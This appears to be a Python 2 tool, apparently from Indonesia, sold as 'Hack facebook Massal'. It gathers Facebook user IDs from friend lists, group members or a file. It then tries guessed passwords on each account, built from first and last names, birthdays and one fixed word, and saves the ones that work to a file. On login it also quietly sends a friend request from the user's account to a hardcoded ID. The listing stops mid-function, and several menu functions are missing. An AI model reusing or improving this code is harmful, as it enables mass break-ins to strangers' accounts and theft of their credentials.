# MAU RECODE?
# GA BISA BUAT TOOLS YA MAKANYA RECODE
# KALO LU RECODE SEMOGA TANGAN KAU BISA GERAK :V
# AUTHOR : ARIEL SANDY PERMANA
# YOUTUBE : Ariel 69 Channel
# SUBSCRIBE NAPA ASW
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

logo2 = "\033[32;1m\033[31;1m\x1b[96;1m_______             _______\n|@|@|@|@|           |@|@|@|@|\n|@|@|@|@|   _____   |@|@|@|@|\n|@|@|@|@| /\\_T_T_/\\ |@|@|@|@|\n|@|@|@|@||/\\ T T /\\||@|@|@|@|\n ~/T~~T~||~\\/~T~\\/~||~T~~T\\~   _    ___ ___ ___ _  _ ___ ___\n  \\|__|_| \\(-(O)-)/ |_|__|/    | |  |_ _/ __| __| \\| / __| __|\n  _| _|    \\8_8//    |_ |_     | |__ | | (__| _|| .` \\__ \\ _|\n|(@)]   /~~[_____]~~\\   [(@)|  |____|___\\___|___|_|\\_|___/___|\n  ~    (  |       |  )    ~\n      [~` ]       [ '~]        +++++++++++++++++++++++++++++++++++++++++++\n      |~~|         |~~|        |     Author : Ariel Sandy Permana        |\n      |  |         |  |        |     YouTube : Ariel 69 Channel          |\n     _<\\/>_       _<\\/>_       +++++++++++++++++++++++++++++++++++++++++++\n    /_====_\\     /_====_\\"

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.08)
        
def ArielSandyPermana(s):
  for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(1./10)

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1 / 100)
        
def restart():
    ngulang = sys.executable
    os.execl(ngulang, ngulang, *sys.argv)
    
os.system('clear')
slowprint(logo2)
print
user = raw_input('\033[32;1m[\033[31;1m#\033[32;1m] LICENSI :  ')
import getpass
if user == 'ASP1609APRIYANI':
    print ('SUKSES... ')
    os.system('xdg-open https://YouTube.com/Ariel69Channel')
    sys.exit
else:
    print 'Login GAGAL, Silahkan hubungi ADMIN'
    os.system('xdg-open https://api.whatsapp.com/send?phone=6281394708954&text=Assalamualaikum')
    time.sleep(3)
    restart()
    
def keluar():
    print '\x1b[1;96m[!] \x1b[1;91mExit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)


logo = '\n\x1b[1;36m \xe2\x96\x88\xe2\x96\x88\xe2\x96\x93        \xe2\x96\x88\xe2\x96\x88\xe2\x96\x93    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84    \xe2\x96\x88     \xe2\x96\x88    \xe2\x96\x88\xe2\x96\x88    \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x92     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\n \x1b[1;36m\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92       \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92    \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x80\xe2\x96\x88   \xe2\x96\x88     \xe2\x96\x88\xe2\x96\x88  \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92   \xe2\x96\x92\xe2\x96\x92 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x92\xe2\x96\x91   \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88   \xe2\x96\x92\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\n \x1b[1;34m\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91       \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92   \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x80\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x92   \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88  \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91   \xe2\x96\x91\xe2\x96\x91  \xe2\x96\x88   \xe2\x96\x91   \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92 \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\n \x1b[1;34m\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91       \xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91   \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92  \xe2\x96\x90\xe2\x96\x8c\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92   \xe2\x96\x93\xe2\x96\x93\xe2\x96\x88  \xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91    \xe2\x96\x91 \xe2\x96\x88 \xe2\x96\x88 \xe2\x96\x92    \xe2\x96\x91\xe2\x96\x93\xe2\x96\x88\xe2\x96\x92  \xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80\n \x1b[1;92m\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92   \xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91   \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91   \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91   \xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x93    \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92   \xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x91   \xe2\x96\x91\xe2\x96\x93\xe2\x96\x88  \xe2\x96\x80\xe2\x96\x88\xe2\x96\x93\n  \x1b[1;92m\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x91\xe2\x96\x93  \xe2\x96\x91   \xe2\x96\x91\xe2\x96\x93     \xe2\x96\x91 \xe2\x96\x92\xe2\x96\x91   \xe2\x96\x92 \xe2\x96\x92    \xe2\x96\x91\xe2\x96\x92\xe2\x96\x93\xe2\x96\x92 \xe2\x96\x92 \xe2\x96\x92    \xe2\x96\x92\xe2\x96\x92 \xe2\x96\x91 \xe2\x96\x91\xe2\x96\x93 \xe2\x96\x91    \xe2\x96\x92 \xe2\x96\x91   \xe2\x96\x91\xe2\x96\x92\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\n\x1b[1;97m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\x1b[1;92m<><>\x1b[1;97m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\n\x1b[1;97m\t           Pembuat Tools\x1b[1;97m: \x1b[1;92mARIEL SANDY PERMANA\n\x1b[1;97m\t           Youtube\x1b[1;97m: \x1b[1;92mAriel 69 Channel\n\x1b[1;97m\t           Git Hub\x1b[1;97m: \x1b[1;92mhttps://github.com/Kingblack44\n\x1b[1;97m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\x1b[1;92m<><>\x1b[1;97m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mSedang masuk \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def siapa():
    os.system('clear')
    nama = raw_input('\x1b[1;97mWhat Your Name ? \x1b[1;91m: \x1b[00m')
    if nama == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        time.sleep(1)
        siapa()
    else:
        os.system('clear')
        jalan('\x1b[1;97mWelcome \x1b[1;92m' + nama + '\n\x1b[1;97m\n\x1b[1;97mSubscribe Channel Admin Plis!!')
        os.system('xdg-open https://YouTube.com/Ariel69Channel')
        time.sleep(1)
        login()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 1 * '\x1b[1;91m\xc2\xab\x1b[1;93m-------------------------\x1b[1;97m\xe2\x9c\xa7\x1b[1;93m------------------------\x1b[1;91m\xc2\xbb'
        print '\x1b[1;97m[\x1b[1;92m*\x1b[1;97m] \x1b[1;96mLOGIN AKUN FACEBOOK DULU \x1b[1;97m[\x1b[1;92m*\x1b[1;97m]'
        id = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;92mID/Email \x1b[1;91m: \x1b[00m\033[45m')
        pwd = raw_input('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \x1b[1;92mPassword \x1b[1;91m: \x1b[00m\033[46m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mLogin Berhasil'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://youtu.be/Ariel69Channel')
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
        keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m]\x1b[1;93m Nama \x1b[1;91m: \x1b[1;92m' + nama + '\x1b[1;97m                  '
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m]\x1b[1;93m ID   \x1b[1;91m: \x1b[1;92m' + id + '\x1b[1;97m              '
    print 42 * '\x1b[1;96m='
    print '\x1b[1;97m1.\x1b[1;93m Hack facebook Massal'
    print '\x1b[1;97m2.\x1b[1;93m Lihat daftar grup               '
    print '\x1b[1;97m3.\x1b[1;93m Informasi akun               '
    print '\x1b[1;97m4.\x1b[1;93m Yahoo clone [ Untuk Hack Facebook Menggunakan Yahoo ]              '
    print '\n\x1b[1;91m0.\x1b[1;91m Logout            '
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97m Pilih >>> \x1b[00m\033[41m')
    if unikers == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih()
    else:
        if unikers == '1':
            super()
        else:
            if unikers == '2':
                grupsaya()
            else:
                if unikers == '3':
                    informasi()
                else:
                    if unikers == '4':
                        yahoo()
                    else:
                        if unikers == '0':
                            os.system('clear')
                            jalan('Menghapus token')
                            os.system('rm -rf login.txt')
                            keluar()
                        else:
                            print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
                            pilih()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    print '\x1b[1;97m1.\x1b[1;93m Hack Facebook dari daftar teman'
    print '\x1b[1;97m2.\x1b[1;93m Hack Facebook dari teman'
    print '\x1b[1;97m3.\x1b[1;93m Hack Facebook dari member grup'
    print '\x1b[1;97m4.\x1b[1;93m Hack Facebook dari file'
    print '\n\x1b[1;91m0.\x1b[1;91m Kembali'
    pilih_super()


def pilih_super():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;97m >>> \x1b[00m\033[41m')
    if peak == '':
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 42 * '\x1b[1;96m='
            jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print 42 * '\x1b[1;96m='
                idt = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
                try:
                    jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                    op = json.loads(jok.text)
                    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama teman\x1b[1;91m :\x1b[1;97m ' + op['name']
                except KeyError:
                    print '\x1b[1;96m[!] \x1b[1;91mTeman tidak ditemukan!'
                    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
                    super()

                jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil ID \x1b[1;97m...')
                r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
                z = json.loads(r.text)
                for i in z['data']:
                    id.append(i['id'])

            else:
                if peak == '3':
                    os.system('clear')
                    print logo
                    print 42 * '\x1b[1;96m='
                    idg = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
                    try:
                        r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                        asw = json.loads(r.text)
                        print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
                    except KeyError:
                        print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
                        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
                        super()

                    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mSedang Mengambil Akun Facebook \x1b[1;97m...')
                    re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                    s = json.loads(re.text)
                    for p in s['data']:
                        id.append(p['id'])

                else:
                    if peak == '4':
                        os.system('clear')
                        print logo
                        print 42 * '\x1b[1;96m='
                        try:
                            idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan nama file  \x1b[1;91m: \x1b[1;97m')
                            for line in open(idlist, 'r').readlines():
                                id.append(line.strip())

                        except IOError:
                            print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
                            raw_input('\n\x1b[1;96m[ \x1b[1;97mKembali \x1b[1;96m]')
                            super()

                    else:
                        if peak == '0':
                            menu()
                        else:
                            print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
                            pilih_super()
        print '\x1b[1;96m[+] \x1b[1;93mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;96m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;96m] \x1b[1;93mSedang Hack Akun Faceboook\x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='

    def main(arg):
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBERHASIL'
                print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
                oks.append(user + pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;92mBERHASIL'
                    print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
                    cek = open('out/super_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                    cek.close()
                    cekpoint.append(user + pass1)
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBERHASIL'
                        print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
                        oks.append(user + pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;92mBERHASIL'
                            print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
                            cek = open('out/super_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                            cek.close()
                            cekpoint.append(user + pass2)
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBERHASIL'
                                print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
                                oks.append(user + pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;92mBERHASIL Gan Jangan Lupa Subscribe Channel Ini https://YouTube.com/Ariel69Channel'
                                    print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
                                    cek = open('out/super_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass3)
                                else:
                                    pass4 = 'Bangsat'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBERHASIL'
                                        print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
                                        oks.append(user + pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;93mAKUN CEKPOINT GAN'
                                            print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
                                            cek = open('out/super_cp.txt', 'a')
                                            cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass4)
                                        else:
                                            birthday = b['birthday']
                                            pass5 = birthday.replace('/', '')
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;96m[\xe2\x9c\x93] \x1b[1;92mBERHASIL'
                                                print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
                                                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
                                                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
                                                oks.append(user + pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;92mBERHASIL'
                                                    print '\x1b[1;96m[\xe2\x9c\xba] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
                                                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
                                                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
                                                    cek = open('out/super_cp.txt', 'a')
                                                    cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass5)
